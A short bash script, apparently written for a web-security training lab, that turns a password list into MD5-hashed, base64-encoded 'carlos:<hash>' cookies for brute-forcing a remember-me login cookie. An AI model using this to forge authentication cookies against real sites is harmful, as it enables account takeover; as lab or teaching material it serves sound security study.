#!/usr/bin/env bash
touch cookies.txt
while IFS= read -r p; do
	Hashed_Pass=$(printf '%s' "$p" | md5sum | cut -d' ' -f1)
	UncodedCookie="carlos:$Hashed_Pass"
	CodedCookie=$(printf "$UncodedCookie" | base64 -w 0)
	printf '%s\n' "$CodedCookie" >> cookies.txt
done < pass_list.txt
